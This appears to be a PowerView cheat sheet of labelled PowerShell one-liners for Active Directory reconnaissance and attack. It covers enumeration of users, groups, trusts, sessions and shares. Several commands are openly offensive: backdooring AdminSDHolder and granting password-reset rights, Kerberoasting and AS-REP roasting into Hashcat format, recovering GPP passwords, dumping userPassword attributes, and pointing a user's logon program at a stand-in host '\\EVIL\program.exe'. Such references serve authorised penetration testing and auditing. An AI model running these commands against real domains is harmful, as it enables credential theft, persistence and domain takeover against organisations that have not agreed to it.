___

Load, help, and creds
- Import PowerView into the current session.
```powershell
Import-Module .\PowerView.ps1
```
- Show detailed help for a function.
```powershell
Get-Help Get-DomainUser -Detailed
```
- Build an alternate credential object for any PowerView function.
```powershell
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a',$SecPassword)
```
- Test using alternate creds with a domain query.
```powershell
Get-DomainUser -Credential $Cred
```

Domain, forest, DCs, sites
- Query info about the current domain.
```powershell
Get-Domain
```
- Query info about a specified (child) domain.
```powershell
Get-Domain -Domain child.corp.local
```
- List domain controllers for the current domain.
```powershell
Get-DomainController
```
- Get forest-level information.
```powershell
Get-Forest
```
- List all domains in the forest.
```powershell
Get-ForestDomain
```
- List forest trusts.
```powershell
Get-ForestTrust
```
- List domain trusts (like nltest /trusted_domains).
```powershell
Get-DomainTrust
```
- Recursively map reachable domain trusts.
```powershell
Get-DomainTrustMapping
```
- Enumerate AD sites.
```powershell
Get-DomainSite
```
- Enumerate AD subnets.
```powershell
Get-DomainSubnet
```
- List global catalog servers in the forest.
```powershell
Get-ForestGlobalCatalog
```

Policy (password/Kerberos)
- Read Kerberos policy from domain policy.
```powershell
(Get-DomainPolicy -Domain corp.local).KerberosPolicy
```
- Read password/lockout policy (SystemAccess) from domain policy.
```powershell
(Get-DomainPolicy -Domain corp.local).SystemAccess
```

Users (filters, UAC, SPN/AS-REP)
- Enumerate users with useful props (UPN, enabled, last logon).
```powershell
Get-DomainUser -Properties samaccountname,UserPrincipalName,Enabled,lastlogontimestamp
```
- Users with passwords not changed in >1 year.
```powershell
$Date=(Get-Date).AddYears(-1).ToFileTime(); Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset
```
- All enabled users (DNs).
```powershell
Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
```
- Enabled users via UAC helper.
```powershell
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
```
- All disabled users (LDAP filter).
```powershell
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=2)"
```
- All disabled users (UAC helper).
```powershell
Get-DomainUser -UACFilter ACCOUNTDISABLE
```
- Users requiring smart card auth (LDAP filter).
```powershell
Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
```
- Users requiring smart card (UAC helper).
```powershell
Get-DomainUser -UACFilter SMARTCARD_REQUIRED
```
- Users NOT requiring smart card (list samaccountname only).
```powershell
Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
```
- Service accounts (users with SPNs).
```powershell
Get-DomainUser -SPN
```
- AS-REP roastable users (no Kerberos preauth).
```powershell
Get-DomainUser -PreauthNotRequired
```
- AS-REP roastable via UAC helper.
```powershell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```
- Mix identity types (SID, DN, GUID, name) for user lookup.
```powershell
'S-1-5-21-890171859-3433809279-3366196753-1114','CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
```
- Users with sidHistory populated.
```powershell
Get-DomainUser -LDAPFilter '(sidHistory=*)' -Properties samaccountname,sidHistory
```
- Service accounts that are (or were) in Domain Admins.
```powershell
Get-DomainUser -SPN | ? {$_.memberOf -match 'Domain Admins'}
```

Groups and membership
- List groups with “admin” in the name.
```powershell
Get-DomainGroup -Identity *admin* -Properties name,distinguishedname
```
- List protected (AdminSDHolder) groups.
```powershell
Get-DomainGroup -AdminCount -Properties name
```
- List groups that don’t have a global scope.
```powershell
Get-DomainGroup -GroupScope NotGlobal -Properties name
```
- List all groups a user/group effectively belongs to (tokenGroups).
```powershell
Get-DomainGroup -MemberIdentity jdoe
```
- Same as above with a DN identity.
```powershell
Get-DomainGroup -MemberIdentity "CN=dfm,CN=Users,DC=testlab,DC=local"
```
- Recursively enumerate group members of Domain Admins.
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Foreign users/groups (cross-domain)
- Find users from foreign domains present in this domain.
```powershell
Get-DomainForeignUser
```
- Find groups in target domain that have foreign members.
```powershell
Get-DomainForeignGroupMember -Domain target.domain.com
```
- List foreignSecurityPrincipals from the GC (for SID/DN correlation).
```powershell
Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://corp.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)'
```

Computers (targeting, delegation)
- Inventory computers with helpful props.
```powershell
Get-DomainComputer -Properties name,dnshostname,operatingsystem,lastlogontimestamp
```
- Filter by OS for servers.
```powershell
Get-DomainComputer -OperatingSystem "*Server*" -Properties name,operatingsystem
```
- Computers allowing unconstrained delegation.
```powershell
Get-DomainComputer -Unconstrained
```
- Computers trusted to authenticate for others (constrained delegation).
```powershell
Get-DomainComputer -TrustedToAuth
```
- Computers with specific SPNs (e.g., SQL).
```powershell
Get-DomainComputer -SPN *SQL* -Properties name,serviceprincipalname
```
- List computers from a specific OU.
```powershell
Get-DomainComputer -SearchBase "LDAP://OU=Servers,DC=corp,DC=local" -Properties dnshostname
```

Sessions, local groups, shares (who/where, not process list)
- Enumerate SMB sessions on a remote host.
```powershell
Get-NetSession -ComputerName FS01.corp.local
```
- Enumerate logged-on users on a host.
```powershell
Get-NetLoggedOn -ComputerName WS01.corp.local
```
- Enumerate current RDP sessions (and source IPs).
```powershell
Get-NetRDPSession -ComputerName WS01.corp.local
```
- List local groups on a host.
```powershell
Get-NetLocalGroup -ComputerName WS01
```
- List members of a local group (default WinNT provider).
```powershell
Get-NetLocalGroupMember -ComputerName WS01 -GroupName "Administrators"
```
- Faster local group member enumeration via Win32 API.
```powershell
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
```
- Enumerate shares on a host.
```powershell
Get-NetShare -ComputerName SQL01
```

User hunting (old Invoke-UserHunter)
- Show all user locations across domain (be noisy).
```powershell
Find-DomainUserLocation -ShowAll
```
- Focus on unconstrained delegation computers and show users.
```powershell
Find-DomainUserLocation -ComputerUnconstrained -ShowAll
```
- Hunt for admin users who allow delegation on unconstrained hosts.
```powershell
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
```
- Hunt specific user and check if you have local admin where found.
```powershell
Find-DomainUserLocation -UserIdentity "jdoe" -CheckAccess
```
- Get logged-on users for all “server” OUs in a domain.
```powershell
Get-DomainOU -Identity *server* -Domain corp.local | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | % { Get-NetLoggedOn -ComputerName $_.dnshostname } }
```

Shares and file discovery
- Enumerate open shares domain-wide.
```powershell
Find-DomainShare
```
- Enumerate only shares you can read.
```powershell
Find-DomainShare -CheckShareAccess
```
- Search domain shares for interesting files (old Invoke-FileFinder).
```powershell
Find-InterestingDomainShareFile -Domain CORP
```
- Same, with alternate credentials.
```powershell
$Password="PASSWORD"|ConvertTo-SecureString -AsPlainText -Force; $Credential=New-Object System.Management.Automation.PSCredential("CORP\user",$Password); Find-InterestingDomainShareFile -Domain CORP -Credential $Credential
```
- Recursively search a specific UNC path for keywords, Office docs, and last-access time.
```powershell
Find-InterestingFile -Path \\SERVER\Share -Include password,creds,secret -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)
```

GPOs, GP links, access mapping
- List all GPOs in the domain.
```powershell
Get-DomainGPO
```
- List OUs and their GPO links.
```powershell
Get-DomainOU -GPLink | Select-Object Name,gplink
```
- List policies applied to a specific computer.
```powershell
Get-DomainGPO -ComputerIdentity WS01.corp.local
```
- Map where a user/group has local group rights via GPO (old Find-GPOLocation).
```powershell
Get-DomainGPOUserLocalGroupMapping -Identity "CORP\Helpdesk"
```
- Check RDP group mapping for a user in a domain.
```powershell
Get-DomainGPOUserLocalGroupMapping -Identity "CORP\user" -Domain corp.local -LocalGroup RDP
```
- Export a CSV of GPO mappings with flattened computer arrays.
```powershell
Get-DomainGPOUserLocalGroupMapping | % { $_.computers = ($_.computers -join ", "); $_ } | Export-Csv -NoTypeInformation gpo_map.csv
```

Delegation reconnaissance
- Users with constrained delegation configured.
```powershell
Get-DomainUser -TrustedToAuth
```
- Computers with constrained delegation configured.
```powershell
Get-DomainComputer -TrustedToAuth
```
- Admin-protected users who are allowed to be delegated (interesting).
```powershell
Get-DomainUser -AllowDelegation -AdminCount
```

ACLs, DCSync rights, AdminSDHolder, backdooring
- Enumerate who has rights over a target object (resolve GUIDs).
```powershell
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
```
- Grant “will” the right to reset “matt”’s password.
```powershell
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```
- Read AdminSDHolder permissions (resolve GUIDs).
```powershell
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
```
- Backdoor AdminSDHolder to grant “matt” full rights to protected objects.
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
- Identify principals with replication (DCSync) or full control (domain DN path).
```powershell
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
```
- Alternative DCSync check using Get-ObjectACL alias/function.
```powershell
Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }
```

GPP and GPP-linked computers
- Recover any stored Group Policy Preferences passwords (legacy).
```powershell
Get-GPPPassword
```
- Resolve all computer DNS hostnames where a given GPP/GPO applies by GUID.
```powershell
Get-DomainOU -GPLink '<GPP_GUID>' | % { Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname }
```

Interesting ACLs and shadow admins
- Find interesting domain ACLs (write/owner/DACL rights) and resolve GUIDs.
```powershell
Find-InterestingDomainAcl -ResolveGUIDs
```
- Flag GPOs where “user” SIDs (>1000) have modification/control rights.
```powershell
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') }
```

OU, file servers, DNS
- List organizational units.
```powershell
Get-DomainOU
```
- Find likely file servers based on user home/profile/script paths.
```powershell
Get-DomainFileServer
```
- Enumerate DNS records for a zone (if DNS partition accessible).
```powershell
Get-DomainDNSRecord -Zone corp.local
```

Trust-aware foreign membership walk
- Pull foreignSecurityPrincipal DNs from GC for later correlation.
```powershell
$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
```
- For each referenced domain, enumerate domain-local groups with those members.
```powershell
$Domains=@{}; ForEach($ForeignUser in $ForeignUsers){ $ForeignUserDomain=$ForeignUser.Substring($ForeignUser.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'; if(-not $Domains[$ForeignUserDomain]){ $Domains[$ForeignUserDomain]=$True; $Filter="(|(member="+($ForeignUsers -join ")(member=")+"))"; Get-DomainGroup -Domain $ForeignUserDomain -Scope DomainLocal -LDAPFilter $Filter -Properties distinguishedname,member } } | fl
```

User impersonation helpers (STA)
- Temporarily impersonate a different credential (runas /netonly-like).
```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a',$SecPassword); Invoke-UserImpersonation -Credential $Cred
```
- Revert impersonation back to self.
```powershell
Invoke-RevertToSelf
```

Object outliers, setters, ownership
- Detect outlier properties across computer objects.
```powershell
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
```
- Set arbitrary attributes on an AD object.
```powershell
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
```
- Take or set ownership of an AD object.
```powershell
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
```

Kerberoasting and AS-REP roast
- Kerberoast using defaults (prints TGS hashes).
```powershell
Invoke-Kerberoast
```
- Kerberoast a specific account, Hashcat format.
```powershell
Invoke-Kerberoast -Identity "svc_sql" -OutputFormat Hashcat
```
- Kerberoast scoped to a specific OU/SearchBase.
```powershell
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -OutputFormat Hashcat
```
- List AS-REP roastable users (no preauth).
```powershell
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```
- Request AS-REP roast for a specific user.
```powershell
Invoke-ASREPRoast -UserName jdoe -Verbose
```

Local admin reachability
- Threaded probe to find where you’re local admin (SMB/RPC).
```powershell
Find-LocalAdminAccess
```
- Test admin access to a single host.
```powershell
Test-AdminAccess -ComputerName WS01
```

Turn short names into FQDNs via GC
- Resolve bare hostnames to FQDNs using the global catalog.
```powershell
gc .\computers.txt | % { Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_) " -Properties dnshostname }
```

Data export/import
- Export objects to XML for offline analysis.
```powershell
Get-DomainUser | Export-Clixml .\users.xml
```
- Re-import exported PowerView objects.
```powershell
$Users = Import-Clixml .\users.xml
```

Password attribute probe (rare, but occasionally exposed)
- Dump userPassword attribute (if present) and render ASCII.
```powershell
$FormatEnumerationLimit=-1; Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % { Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru } | fl
```

Common pipelines and counts
- Count total domain users quickly.
```powershell
(Get-DomainUser).Count
```
- Find non-empty user description fields.
```powershell
Get-DomainUser -Properties samaccountname,description | ? { $_.description -ne $null }
```

Process enumeration (not a PowerView function)
PowerView 3.x has no Get-NetProcess; use native remoting/WMI/CIM:
- Get processes on a remote host via WinRM (PowerShell remoting).
```powershell
Invoke-Command -ComputerName WS01 -ScriptBlock { Get-Process } -Credential $Cred
```
- Query processes via CIM (WSMan) on a remote host.
```powershell
Get-CimInstance Win32_Process -ComputerName WS01 -Credential $Cred
```
- Query processes via legacy WMI (DCOM) on a remote host.
```powershell
Get-WmiObject Win32_Process -ComputerName WS01 -Credential $Cred
```
